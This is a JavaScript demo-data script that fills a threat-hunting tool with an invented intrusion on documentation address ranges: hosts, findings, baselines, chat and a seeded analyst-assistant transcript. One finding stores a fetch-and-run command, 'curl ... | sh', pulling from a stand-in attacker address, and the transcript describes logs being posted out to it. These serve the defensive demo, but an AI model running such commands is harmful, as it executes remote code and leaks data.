/**
 * Fill a store with a synthetic exercise, for screenshots and for trying the
 * tool out without a real engagement in front of you.
 *
 *   HUNT_MISSIONS=/tmp/demo/missions HUNT_MISSION=demo \
 *   HUNT_DB=/tmp/demo/hunt.db HUNT_PLAN=/tmp/demo/plan.json \
 *     node tools/demo-data.mjs
 *
 * All four matter, and HUNT_PLAN most easily forgotten: the live plan path is
 * resolved once at module load, so without it the demo reads and imports the
 * plan of whatever engagement is in this working copy. Start the server with
 * the same four.
 *
 * Everything here is invented. Addresses come from the ranges reserved for
 * documentation — 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 — and the
 * people are the example roster. Nothing in this file may name a real host, a
 * real address or a real teammate: it is tracked, and the screenshots made
 * from it are published.
 *
 * Refuses to run against a store that already holds an engagement, because the
 * whole point is that it writes freely.
 */
import { mkdirSync, writeFileSync, copyFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { openDb, initSchema } from '../store/db.js';
import { setVerdict, listHosts } from '../store/hosts.js';
import { listThreads } from '../store/threads.js';
import { listMembers } from '../store/members.js';
import { seedAll } from '../store/seed.js';
import { createRecord, promoteRecord, denyRecord, listRecords } from '../store/records.js';
import { proposeEdge, confirmEdge } from '../store/edges.js';
import { createCharSnapshot, stageSnapshot, setFieldGaps } from '../store/characterization.js';
import { ensureTeamChannel, postMessage } from '../store/chat.js';
import { importPlan, listPlan, setAssignees, setTaskStatus } from '../store/plan.js';
import { sessionForMember, appendMessage } from '../store/sessions.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, '..');

/*
  A profile of its own rather than editing missions/example, which the tests
  read and which deliberately contains awkward cases they depend on — two
  tools sharing one address among them.

  Both variables have to be set before this runs, because the mission module
  resolves them once at load, and the server that follows needs the same two.
*/
const MISSIONS = process.env.HUNT_MISSIONS;
const CODE = process.env.HUNT_MISSION || 'demo';
if (!MISSIONS) {
  console.error('set HUNT_MISSIONS to a scratch directory; this writes a profile into it');
  process.exit(1);
}
/*
  Refused rather than defaulted. Without HUNT_PLAN the live plan path resolves
  against this working copy, and the demo would import a real engagement's plan
  into a store whose whole purpose is to contain nothing real.
*/
if (!process.env.HUNT_PLAN) {
  console.error('set HUNT_PLAN to a path inside the demo directory, or the real plan gets imported');
  process.exit(1);
}

const db = openDb(process.env.HUNT_DB || join(MISSIONS, '..', 'demo.db'));
initSchema(db);

if (db.prepare('select count(*) n from records').get().n > 0) {
  console.error('this store already holds findings; point HUNT_DB at a new file');
  process.exit(1);
}

// --- terrain ---------------------------------------------------------------------

const HOSTS = [];
const push = (name, ip, enclave, segment, cidr, os, role, extra = {}) =>
  HOSTS.push({ name, ip, enclave, segment, cidr, os, role, ...extra });

push('DC-01.range.example', '192.0.2.10', 'Alpha Site', 'servers', '192.0.2.0/24',
  'Windows Server 2019', 'Domain Controller', { presence: 'confirmed', domainJoined: true });
push('FS-01.range.example', '192.0.2.11', 'Alpha Site', 'servers', '192.0.2.0/24',
  'Windows Server 2019', 'File Server', { presence: 'confirmed', domainJoined: true });
push('WEB-01.range.example', '192.0.2.12', 'Alpha Site', 'dmz', '192.0.2.0/24',
  'Ubuntu 22.04', 'Web Server', { presence: 'confirmed' });
for (let i = 1; i <= 14; i++) {
  push(`WKS-${String(i).padStart(2, '0')}.range.example`, `192.0.2.${40 + i}`,
    'Alpha Site', 'workstations', '192.0.2.0/24', 'Windows 11', 'Workstation',
    { presence: i > 12 ? 'unanswered' : 'alive-named', domainJoined: true });
}
for (let i = 1; i <= 8; i++) {
  push(`RL-${String(i).padStart(2, '0')}.range.example`, `198.51.100.${20 + i}`,
    'Bravo Site', 'linux', '198.51.100.0/24', 'Rocky Linux 9', 'Application',
    { presence: 'alive-named' });
}
push('JUMP-01.range.example', '198.51.100.5', 'Bravo Site', 'admin', '198.51.100.0/24',
  'Windows Server 2022', 'Jump Host', { presence: 'confirmed', domainJoined: true });
push('UNKNOWN-A', '198.51.100.77', 'Bravo Site', 'linux', '198.51.100.0/24', null, null,
  { presence: 'alive-unidentified', domainJoined: false });
push('HMI-01', '203.0.113.10', 'OT Ring', 'process', '203.0.113.0/24',
  'Windows 10 LTSC', 'Operator HMI', { presence: 'confirmed' });
push('PLC-A', '203.0.113.20', 'OT Ring', 'process', '203.0.113.0/24', 'Embedded', 'PLC');
push('PLC-B', '203.0.113.21', 'OT Ring', 'process', '203.0.113.0/24', 'Embedded', 'PLC');
push('HISTORIAN-01', '203.0.113.30', 'OT Ring', 'process', '203.0.113.0/24',
  'Windows Server 2016', 'Historian', { presence: 'confirmed' });

/*
  Written as terrain rather than seeded straight into the table, so the server
  that starts afterwards reconciles to exactly this and does not replace it.
  seedAll is what the server runs on boot; running it here means the demo is
  already in the state a real start would produce.
*/
const profile = join(MISSIONS, CODE);
mkdirSync(profile, { recursive: true });

const enclaves = new Map();
for (const h of HOSTS) {
  if (!enclaves.has(h.enclave)) enclaves.set(h.enclave, new Map());
  const segs = enclaves.get(h.enclave);
  if (!segs.has(h.segment)) segs.set(h.segment, []);
  segs.get(h.segment).push({
    name: h.name, ip: h.ip, os: h.os ?? 'unknown', role: h.role ?? '',
    kind: /Windows/i.test(h.os ?? '') ? 'win' : 'nix', source: 'inventory',
    presence: h.presence ?? 'unsurveyed', presenceNote: '',
    domainJoined: h.domainJoined ?? false,
  });
}
writeFileSync(join(profile, 'terrain.json'), JSON.stringify({
  source: 'Synthetic demo terrain. Not a real network.',
  vantages: ['DC-01'],
  enclaves: [...enclaves].map(([name, segs]) => ({
    key: name.toLowerCase().replace(/\W+/g, '-'), name,
    cidr: [...segs.values()][0][0].ip.replace(/\.\d+$/, '.0') + '/24',
    description: '', segments: [...segs].map(([sn, hosts]) => ({
      name: sn, cidr: hosts[0].ip.replace(/\.\d+$/, '.0') + '/24', note: '', hosts,
    })),
  })),
}, null, 2) + '\n');

writeFileSync(join(profile, 'mission.json'), JSON.stringify({
  name: 'Demo Range', code: CODE, week: 'Week 1 — synthetic',
  notes: 'Generated by tools/demo-data.mjs. Every address is from a documentation range.',
  briefing: ['A synthetic range used for screenshots and for trying the tool out.'],
}, null, 2) + '\n');

for (const f of ['roster.json', 'threads.json']) {
  const from = join(REPO, 'missions', 'example', f);
  if (existsSync(from)) copyFileSync(from, join(profile, f));
}

/*
  A plan of its own rather than the example one, so the tasks describe the same
  intrusion as the findings and the baselines. A screenshot of four unrelated
  placeholder tasks says nothing about what the view is for.
*/
const task = (key, title, o = {}) => ({
  key, title, source: 'seed', priority: o.priority ?? 'normal', team: o.team ?? '',
  intent: o.intent ?? '', mitre: o.mitre ?? [], tools: o.tools ?? [],
  dataSources: o.data ?? [], commands: o.commands ?? [], terrain: o.terrain ?? [],
  references: [], evidenceExpected: o.expect ?? '', analysis: '', doNext: '',
  steps: (o.steps ?? []).map(([text, tooling, expect]) => ({ text, tooling, expect, source: 'seed' })),
  original: null, assignees: [], stepsSource: (o.steps ?? []).length ? 'authored' : 'standard-loop',
  ttpText: (o.mitre ?? []).join(', '),
});

writeFileSync(join(profile, 'plan.json'), JSON.stringify({
  plan: { name: 'Demo Range hunt plan', intent: 'Synthetic. The shape of a plan, on the demo terrain.' },
  phases: [
    {
      key: 'P0', name: 'Phase 0 — Terrain', source: 'seed',
      intent: 'Know what is out there before hunting on it.',
      tasks: [
        task('DEM-p0-survey', 'Survey and reconcile the terrain', {
          priority: 'high', team: 'Alpha', mitre: ['T1590'], data: ['DNS', 'AD', 'ICMP'],
          tools: ['Invoke-TerrainSurvey.ps1'],
          intent: 'The inventory and reality drift. Establish which hosts actually answer before drawing conclusions from silence.',
          expect: 'A host list with presence recorded for every entry, including the ones that did not answer.',
          steps: [
            ['Run the survey from a vantage inside each enclave.', 'tools/Invoke-TerrainSurvey.ps1', 'One JSON file per vantage.'],
            ['Merge the vantages and strip DNS-cache noise.', 'terrain/extract.mjs', 'A single terrain.json.'],
            ['Import it and read the never-characterized list.', 'Characterization → any repository', 'Every host accounted for or explained.'],
          ],
        }),
        task('DEM-p0-scan', 'Service scan every reachable address', {
          priority: 'high', team: 'Alpha', mitre: ['T1046'], tools: ['nmap'], data: ['scan'],
          intent: 'A listening port is the cheapest characterization there is, and the OT ring is where an unexpected one matters most.',
          expect: 'A network-services baseline covering every address that answered the survey.',
          steps: [
            ['Scan each segment from inside it, not across the boundary.', 'nmap -sCV -p-', 'Per-host service lists.'],
            ['Import as network-services and mark the snapshot complete.', 'Characterization → Import', 'Coverage judged against the survey.'],
          ],
        }),
      ],
    },
    {
      key: 'P1', name: 'Phase 1 — Hunt', source: 'seed',
      intent: 'Look for the adversary on the terrain you just mapped.',
      tasks: [
        task('DEM-p1-persist', 'Sweep scheduled tasks and cron across both estates', {
          priority: 'high', team: 'Bravo', mitre: ['T1053.003', 'T1053.005'],
          tools: ['Get-ScheduledTask', 'crontab'], data: ['cron', 'Task Scheduler'],
          intent: 'Persistence is the one thing an operator has to leave behind. A baseline across identical hosts turns it into an outlier rather than a judgement call.',
          expect: 'One scheduled-tasks baseline per estate, and a short list of entries that exist on one host and not its siblings.',
          steps: [
            ['Collect from every host in the segment, not a sample.', 'Get-ScheduledTask / cat /etc/cron.d/*', 'Rows for every host.'],
            ['Import against the existing baseline.', 'Characterization → Scheduled tasks', 'A New band that is short enough to read.'],
            ['Acknowledge fields the command did not return.', 'the acknowledge control', 'Gaps stop reading as changes.'],
          ],
        }),
        task('DEM-p1-spray', 'Hunt for password spraying against the domain', {
          priority: 'normal', team: 'Bravo', mitre: ['T1110.003'], data: ['4625', '4768'],
          tools: ['Get-WinEvent'],
          intent: 'A spray is quiet per account and loud across the estate. Count by source, not by target.',
          expect: 'Failed-logon counts grouped by source address, with anything above the estate baseline named.',
        }),
        task('DEM-p1-creds', 'Look for credential access on the domain controller', {
          priority: 'high', team: 'Bravo', mitre: ['T1003.003'], data: ['4688', 'Sysmon 1'],
          tools: ['Get-WinEvent'], terrain: ['DC-01.range.example'],
          intent: 'ntdsutil and vssadmin have narrow legitimate uses on a DC, so interactive use is worth a look every time.',
          expect: 'Process-creation events for ntdsutil, vssadmin and diskshadow with parent and user.',
          steps: [
            ['Pull 4688 for the shortlist of binaries.', 'Get-WinEvent -FilterHashtable', 'Events with parents.'],
            ['Check each against the change calendar before filing.', '—', 'Either a finding or a documented backup run.'],
          ],
        }),
      ],
    },
    {
      key: 'P2', name: 'Phase 2 — Characterize and hand over', source: 'seed',
      intent: 'Turn what was found into something the site can act on.',
      tasks: [
        task('DEM-p2-ot', 'Establish what normal looks like on the process ring', {
          priority: 'high', team: 'Command', mitre: ['T1692.001'], data: ['span/tap'],
          terrain: ['HMI-01', 'PLC-A', 'PLC-B', 'HISTORIAN-01'],
          intent: 'A Modbus write is not an indicator on its own. Without a baseline of who writes to what, every one of them is either ignored or escalated, and both are wrong.',
          expect: 'A list of the source addresses that normally write to each PLC, agreed with the site engineer.',
        }),
        task('DEM-p2-report', 'Write the handover', {
          priority: 'normal', team: 'Command',
          intent: 'The findings are worth what the site can do with them after the team leaves.',
          expect: 'The exported workbook plus a page per confirmed host: what was seen, what was checked, what is still open.',
        }),
      ],
    },
  ],
}, null, 2) + '\n');

/*
  No pointer is written. data/mission is the *real* server's runtime state and
  writing it here would repoint a live engagement at the demo. HUNT_MISSION
  takes precedence over the pointer, so the demo server is told which profile
  to use through the environment and the pointer is left alone.
*/
seedAll(db);

const host = (n) => listHosts(db).find(h => h.name.startsWith(n));
setVerdict(db, host('WEB-01').id, 'confirmed', 'Okafor');
setVerdict(db, host('RL-03').id, 'suspected', 'Lindqvist');
setVerdict(db, host('WKS-04').id, 'cleared', 'Lindqvist');

// --- findings ---------------------------------------------------------------------

const threads = listThreads(db);
const T = (i) => threads[i % threads.length]?.id ?? null;

const FINDINGS = [
  ['filed', 0, {
    event_time: '2026-03-11 21:14:07Z', hostname: 'WEB-01.range.example',
    source_ip: '203.0.113.200', destination_ip: '192.0.2.12:443',
    indicator: 'nginx', user: 'www-data',
    description: 'SQL injection against the public form, followed by a webshell written to /var/www/uploads',
    mitre: 'T1190', confidence: 'High', triage_status: 'Corroborated',
    evidence_source: 'Web access log',
  }],
  ['filed', 0, {
    event_time: '2026-03-11 21:31:52Z', hostname: 'WEB-01.range.example',
    source_ip: '192.0.2.12', destination_ip: '203.0.113.200:8443',
    indicator: 'curl', user: 'www-data', command: 'curl -s http://203.0.113.200:8443/a | sh',
    description: 'Second stage pulled down and piped straight to a shell',
    mitre: 'T1105', confidence: 'High', triage_status: 'Corroborated',
    evidence_source: 'Bash history',
  }],
  ['filed', 1, {
    event_time: '2026-03-11 22:02:10Z', hostname: 'RL-03.range.example',
    source_ip: '192.0.2.12', destination_ip: '198.51.100.23:22',
    indicator: 'sshd', user: 'svc_deploy',
    description: 'Reused deployment credential accepted from the web host, first time that pair has been seen',
    mitre: 'T1078', confidence: 'Medium', triage_status: 'Investigating',
    evidence_source: 'auth.log',
  }],
  ['filed', 1, {
    event_time: '2026-03-11 22:40:00Z', hostname: 'RL-03.range.example',
    indicator: 'cron', user: 'root', command: '/etc/cron.d/log-sync',
    description: 'Cron entry named log-sync that calls out every fifteen minutes',
    mitre: 'T1053.003', confidence: 'High', triage_status: 'Corroborated',
    evidence_source: 'Cron inventory',
  }],
  ['filed', 2, {
    event_time: '2026-03-12 01:05:44Z', hostname: 'JUMP-01.range.example',
    source_ip: '198.51.100.23', destination_ip: '198.51.100.5:5985',
    indicator: 'wsmprovhost.exe', user: 'RANGE\\svc_deploy',
    description: 'WinRM from the Linux estate into the jump host, outside any change window',
    mitre: 'T1021.006', confidence: 'Medium', triage_status: 'Investigating',
    evidence_source: 'Windows Event Log 4624',
  }],
  ['pending', 2, {
    event_time: '2026-03-12 01:22:19Z', hostname: 'DC-01.range.example',
    indicator: 'ntdsutil.exe', user: 'RANGE\\svc_deploy',
    description: 'ntdsutil invoked interactively on the domain controller',
    mitre: 'T1003.003', confidence: 'High', triage_status: 'New',
    evidence_source: 'Process telemetry',
  }],
  ['pending', 3, {
    event_time: '2026-03-12 02:11:00Z', hostname: 'HMI-01',
    source_ip: '198.51.100.5', destination_ip: '203.0.113.10:502',
    indicator: 'modbus', description: 'Modbus write from the admin segment toward the process ring',
    mitre: 'T1692.001', confidence: 'Low', triage_status: 'New',
    evidence_source: 'Span port capture',
  }],
  ['denied', 3, {
    event_time: '2026-03-12 03:00:00Z', hostname: 'WKS-04.range.example',
    indicator: 'PSEXESVC.exe', user: 'RANGE\\helpdesk',
    description: 'Remote service creation — turned out to be the scheduled patch run',
    mitre: 'T1569.002', confidence: 'Low', triage_status: 'Ruled Out',
    evidence_source: 'Windows Event Log 7045',
  }],
];

const filed = [];
for (const [state, thread, fields] of FINDINGS) {
  const rec = createRecord(db, fields, { analyst: 'Okafor', threadId: T(thread) });
  if (state === 'filed') promoteRecord(db, rec.id, 'Reyes');
  if (state === 'denied') denyRecord(db, rec.id, 'Reyes');
  filed.push(rec);
}

/*
  The chain, so the timeline has arcs on it and the adjudication rail is not
  empty. Three confirmed and one left proposed, which is the honest state of a
  case in progress: somebody has to decide whether the Modbus write follows
  from the jump host or merely happens after it.
*/
const link = (a, b, kind, rationale, confirm) => {
  const e = proposeEdge(db, {
    srcRecordId: filed[a].id, dstRecordId: filed[b].id, kind, rationale,
  }, 'Okafor');
  if (confirm) confirmEdge(db, e.id, 'Reyes');
};
link(0, 1, 'caused', 'The webshell is what ran the curl; same process tree, seventeen minutes apart.', true);
link(1, 2, 'caused', 'The credential used on RL-03 was in the staged archive the second stage pulled down.', true);
link(2, 4, 'caused', 'Same account, and RL-03 is the only host that had reached the jump host before.', true);
link(4, 6, 'caused', 'Times fit and the source is the jump host, but nothing rules out the site engineer.', false);

// --- baselines ---------------------------------------------------------------------

const run = (repo, who) => createCharSnapshot(db, { repo, createdBy: who }).id;

const accountsRun = run('accounts', 'Lindqvist');
const LINUX_ACCOUNTS = [
  ['root', '0', '/bin/bash', '/root'], ['bin', '1', '/sbin/nologin', '/bin'],
  ['daemon', '2', '/sbin/nologin', '/sbin'], ['adm', '3', '/sbin/nologin', '/var/adm'],
  ['sshd', '74', '/sbin/nologin', '/var/empty/sshd'],
  ['svc_deploy', '1001', '/bin/bash', '/home/svc_deploy'],
  ['nginx', '988', '/sbin/nologin', '/var/lib/nginx'],
];
for (let i = 1; i <= 8; i++) {
  stageSnapshot(db, {
    repo: 'accounts', host: `RL-${String(i).padStart(2, '0')}.range.example`,
    snapshotId: accountsRun, analyst: 'Lindqvist', sourceFormat: '/etc/passwd export',
    claimedRows: LINUX_ACCOUNTS.length,
    entities: LINUX_ACCOUNTS.map(([UserName, UserId, DefaultShell, HomeDirectory]) =>
      ({ UserName, UserId, DefaultShell, HomeDirectory, IsLocalAccount: 'true' })),
  });
}

const procRun = run('processes', 'Lindqvist');
for (const h of ['DC-01.range.example', 'FS-01.range.example', 'JUMP-01.range.example']) {
  stageSnapshot(db, {
    repo: 'processes', host: h, snapshotId: procRun, analyst: 'Lindqvist',
    sourceFormat: 'Get-Process | Select Name,Path,Id', claimedRows: 6,
    entities: [
      { name: 'svchost.exe', path: 'C:/Windows/System32/svchost.exe', user: 'SYSTEM', pid: '812' },
      { name: 'lsass.exe', path: 'C:/Windows/System32/lsass.exe', user: 'SYSTEM', pid: '664' },
      { name: 'explorer.exe', path: 'C:/Windows/explorer.exe', user: 'RANGE\\helpdesk', pid: '4120' },
      { name: 'MsMpEng.exe', path: 'C:/ProgramData/Microsoft/Windows Defender/MsMpEng.exe', user: 'SYSTEM', pid: '2408' },
      { name: 'spoolsv.exe', path: 'C:/Windows/System32/spoolsv.exe', user: 'SYSTEM', pid: '1544' },
      { name: 'sshd.exe', path: 'C:/Program Files/OpenSSH/sshd.exe', user: 'SYSTEM', pid: '3312' },
    ],
  });
}

const taskRun = run('scheduled-tasks', 'Baptiste');
for (let i = 1; i <= 6; i++) {
  const h = `RL-${String(i).padStart(2, '0')}.range.example`;
  const rows = [
    { name: '0hourly', location: '/etc/cron.d/0hourly', command: 'run-parts /etc/cron.hourly', user: 'root', trigger: 'hourly' },
    { name: 'logrotate', location: '/etc/cron.daily/logrotate', command: '/usr/sbin/logrotate', user: 'root', trigger: 'daily' },
    { name: 'sysstat', location: '/etc/cron.d/sysstat', command: '/usr/lib64/sa/sa1 1 1', user: 'root', trigger: 'every 10 min' },
  ];
  // One host carries the finding's cron entry; the rest do not, so the delta
  // has something in it worth looking at.
  if (i === 3) rows.push({ name: 'log-sync', location: '/etc/cron.d/log-sync', command: '/usr/local/bin/log-sync.sh', user: 'root', trigger: 'every 15 min' });
  stageSnapshot(db, {
    repo: 'scheduled-tasks', host: h, snapshotId: taskRun, analyst: 'Baptiste',
    sourceFormat: 'cron + systemd timer sweep', claimedRows: rows.length, entities: rows,
  });
}

const svcRun = run('network-services', 'Baptiste');
const SCAN = {
  '192.0.2.10': [['53', 'domain'], ['88', 'kerberos-sec'], ['389', 'ldap'], ['445', 'microsoft-ds']],
  '192.0.2.12': [['80', 'http'], ['443', 'ssl/http'], ['22', 'ssh']],
  '198.51.100.5': [['3389', 'ms-wbt-server'], ['5985', 'http'], ['445', 'microsoft-ds']],
  '198.51.100.77': [['22', 'ssh'], ['8080', 'http-proxy']],
  '203.0.113.10': [['502', 'mbap'], ['80', 'http']],
  '203.0.113.20': [['502', 'mbap']],
  '203.0.113.21': [['502', 'mbap']],
};
for (const [ip, ports] of Object.entries(SCAN)) {
  stageSnapshot(db, {
    repo: 'network-services', host: ip, snapshotId: svcRun, analyst: 'Baptiste',
    sourceFormat: 'nmap -sCV -p-', claimedRows: ports.length,
    entities: ports.map(([port, service]) => ({ port, protocol: 'tcp', state: 'open', service })),
  });
}

// A second, thinner accounts collection so the comparison has a gap in it —
// this is what the acknowledge-as-not-collected band is for.
const thinRun = run('accounts', 'Okafor');
for (let i = 1; i <= 4; i++) {
  stageSnapshot(db, {
    repo: 'accounts', host: `RL-${String(i).padStart(2, '0')}.range.example`,
    snapshotId: thinRun, analyst: 'Okafor', sourceFormat: 'getent passwd (names only)',
    claimedRows: LINUX_ACCOUNTS.length,
    entities: LINUX_ACCOUNTS.map(([UserName, UserId]) => ({ UserName, UserId })),
  });
}
setFieldGaps(db, thinRun, ['shell', 'home'], {
  actor: 'Okafor', note: 'getent run without the shell and home fields',
});

// --- plan, chat, inbox ---------------------------------------------------------------

try {
  importPlan(db);
  const tasks = listPlan(db);
  const at = (i, who, status) => {
    if (!tasks[i]) return;
    if (who) setAssignees(db, tasks[i].taskKey, who, 'Okafor');
    if (status) setTaskStatus(db, tasks[i].taskKey, status, who?.[0] ?? 'Okafor');
  };
  at(0, ['Baptiste'], 'complete');
  at(1, ['Baptiste'], 'complete');
  at(2, ['Lindqvist'], 'in-progress');
  at(3, ['Okafor'], null);
  at(4, ['Lindqvist'], null);
  // One left unassigned on purpose: the header counts it, and an unassigned
  // task in the last phase is the normal state of a plan mid-mission.
  at(6, null, null);
} catch { /* no seed plan on this clone; the rest of the demo stands */ }

const team = ensureTeamChannel(db);
const names = listMembers(db).map(m => m.name);
const say = (author, body) => postMessage(db, { channelId: team.id, author, body, roster: names });
say('Okafor', 'Web host is confirmed. Second stage came down over 8443 and ran straight from a pipe.');
say('Baptiste', 'Scan is in. The unidentified box on the Bravo linux segment answers on 22 and 8080 and is not in the inventory.');
say('Lindqvist', 'Cron sweep done across RL-01 to 06. One entry called log-sync only exists on RL-03.');
say('Okafor', '@Lindqvist can you take the domain controller next, ntdsutil is sitting in the pending rail');
say('Reyes', 'Holding the OT finding until we have a second source on that Modbus write.');

/*
  A transcript in one window, because an empty session is the screenshot of the
  feature this whole application is built around. Written straight into the
  store rather than by running a turn: a real turn costs quota, needs the CLI
  signed in, and would produce different prose every time the demo is rebuilt.
*/
const mine = listMembers(db).find(m => m.name === 'Lindqvist');
const win = mine ? sessionForMember(db, mine.id) : null;
if (win) {
  appendMessage(db, win.id, 'user', [
    'Cron sweep across the Bravo linux segment. RL-03 is the only host with this entry:',
    '',
    '  /etc/cron.d/log-sync',
    '  */15 * * * * root /usr/local/bin/log-sync.sh',
    '',
    'The script is 40 lines, tars /var/log and posts it to 203.0.113.200:8443.',
    'Same address the web host pulled its second stage from.',
  ].join('\n'), 'evidence');

  appendMessage(db, win.id, 'assistant', [
    'That is the same infrastructure as the WEB-01 second stage, which makes this',
    'persistence on a host the operator already had, not a separate intrusion.',
    '',
    '**Why it stands out**',
    '',
    '- One host out of six carries the entry. The other five ran the same build,',
    '  so this is a change to RL-03 rather than a property of the platform.',
    '- Named to read as maintenance. `log-sync` next to `logrotate` and `sysstat`',
    '  is close enough to pass a glance at the directory.',
    '- Fifteen minutes is a collection cadence, not a beacon. Worth checking the',
    '  egress logs for the shape rather than the frequency.',
    '',
    '**What would settle it**',
    '',
    '1. `stat` the file and compare against the deployment credential use at 22:02.',
    '2. Read `/usr/local/bin/log-sync.sh` for what it selects out of `/var/log`.',
    '3. Look for the same path on JUMP-01, which svc_deploy reached next.',
    '',
    'I have proposed a finding for the pending rail. It needs a second source',
    'before it is worth more than Medium.',
  ].join('\n'), 'evidence');
}

console.log(`  hosts     ${listHosts(db).length}`);
console.log(`  findings  ${listRecords(db).length}`);
console.log(`  baselines ${db.prepare('select count(*) n from char_entities').get().n} rows`);
console.log(`  members   ${listMembers(db).length}`);
/*
  Which token to screenshot with.

  The sessions view opens the signed-in member's own window, so a run started
  with somebody else's token photographs an empty transcript — which is the
  screenshot of the one feature this application is built around. Printed here
  rather than left to be rediscovered.
*/
if (mine) {
  const tok = listMembers(db).find(m => m.id === mine.id)?.token;
  console.log(`\n  screenshot as  ${mine.name}  ${tok}`);
  console.log('  (their window holds the seeded transcript; any other token shows an empty one)');
}

console.log('\nsynthetic. Documentation addresses only, example roster only.');
